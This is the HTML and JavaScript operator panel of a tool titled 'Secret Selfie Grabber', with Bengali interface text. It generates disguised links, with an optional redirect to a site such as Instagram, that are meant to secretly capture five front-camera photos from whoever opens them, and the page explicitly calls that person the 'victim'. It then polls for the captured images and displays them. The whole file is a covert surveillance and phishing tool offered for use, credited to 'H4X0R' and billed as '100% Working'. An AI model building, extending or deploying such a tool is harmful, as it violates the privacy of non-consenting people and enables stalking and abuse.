<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CamSnap • Secret Selfie Grabber</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
    body{background:#f8f9fa;color:#222;line-height:1.6;}
    header{background:#fff;padding:20px;text-align:center;border-bottom:2px solid #eee;box-shadow:0 2px 10px rgba(0,0,0,0.05);}
    header img{height:55px;border-radius:8px;}
    main{max-width:520px;margin:20px auto;padding:0 15px;}
    .card{background:#fff;border-radius:16px;padding:30px;box-shadow:0 8px 30px rgba(0,0,0,0.08);border:1px solid #eee;}
    h1{font-size:2em;text-align:center;margin-bottom:10px;}
    p{text-align:center;color:#555;margin-bottom:25px;}
    button{background:#0066ff;color:#fff;border:none;padding:16px;font-size:1.1em;border-radius:12px;width:100%;cursor:pointer;font-weight:600;}
    button:hover{background:#0052cc;}
    #linkBox{margin-top:25px;padding:20px;background:#f0f7ff;border:2px dashed #0066ff;border-radius:12px;display:none;}
    input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:10px;font-size:1em;}
    .btn-small{display:inline-block;width:auto;padding:10px 20px;margin:5px;font-size:0.95em;}
    .photos{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:15px;margin-top:30px;}
    .photos img{width:100%;height:160px;object-fit:cover;border-radius:12px;border:3px solid #0066ff;cursor:pointer;box-shadow:0 4px 15px rgba(0,102,255,0.3);}
    .loading{text-align:center;padding:40px;color:#666;font-size:1.1em;}
    footer{text-align:center;padding:20px;color:#777;font-size:0.9em;background:#fff;border-top:1px solid #eee;}
  </style>
</head>
<body>

<header>
  <img src="https://i.imgur.com/7K8vR2p.png" alt="CamSnap">
</header>

<main>
  <div class="card">
    <h1>CamSnap Pro</h1>
    <p>একটা লিংক বানাও — কেউ খুললেই তার ফ্রন্ট ক্যামেরা থেকে ৫টা সেলফি চলে আসবে!</p>

    <button onclick="generateLink()">নতুন লিংক তৈরি করুন</button>

    <div id="linkBox">
      <p style="text-align:center;color:#0066ff;font-weight:600;">তোমার লিংক রেডি!</p>

      <input type="text" id="redirectUrl" placeholder="রিডাইরেক্ট লিংক (যেমন: https://instagram.com)" value="">

      <input type="text" id="victimLink" readonly style="background:#f8f9fa;font-weight:500;margin-top:15px;">

      <div style="text-align:center;">
        <button class="btn-small" onclick="saveAndUpdate()">সেভ ও আপডেট করুন</button>
        <button class="btn-small" style="background:#28a745;" onclick="copyLink()">কপি করুন</button>
      </div>

      <div style="text-align:center;margin-top:15px;">
        <a href="" id="testLink" target="_blank" style="color:#0066ff;text-decoration:underline;">মোবাইলে টেস্ট করো</a>
      </div>
    </div>

    <div id="photos" class="photos">
      <div class="loading">নতুন লিংক বানালে এখানে সেলফি ছবি আসবে...</div>
    </div>
  </div>
</main>

<footer>Developed by H4X0R • 100% Working 2025</footer>

<script>
let currentId = null;
const base = location.href.split('index.html')[0];

function generateLink() {
  currentId = Date.now().toString(36) + Math.random().toString(36).substr(2, 6);
  updateVictimLink();
  document.getElementById("linkBox").style.display = "block";
  document.getElementById("photos").innerHTML = `<div class="loading">অপেক্ষা করো... ভিকটিম ক্যামেরা অন করলেই ছবি আসবে</div>`;
  startChecking();
}

function saveAndUpdate() {
  updateVictimLink();
  alert("লিংক সেভ ও আপডেট হয়েছে!");
}

function updateVictimLink() {
  const redirect = document.getElementById("redirectUrl").value.trim();
  let url = `${base}view.html?id=${currentId}`;
  if (redirect && redirect !== "") {
    url += `&r=${encodeURIComponent(redirect)}`;
  }
  document.getElementById("victimLink").value = url;
  document.getElementById("testLink").href = url;
}

function copyLink() {
  const link = document.getElementById("victimLink");
  link.select();
  navigator.clipboard.writeText(link.value);
  alert("লিংক কপি হয়ে গেছে!");
}

function startChecking() {
  if (!currentId) return;
  const check = () => {
    const data = localStorage.getItem('camsnap_' + currentId);
    if (data) {
      const imgs = JSON.parse(data);
      document.getElementById("photos").innerHTML = '';
      imgs.forEach(src => {
        const img = document.createElement('img');
        img.src = src;
        img.onclick = () => window.open(src, '_blank');
        document.getElementById("photos").appendChild(img);
      });
      localStorage.removeItem('camsnap_' + currentId);
    }
    setTimeout(check, 2500);
  };
  check();
}
</script>
</body>
</html>
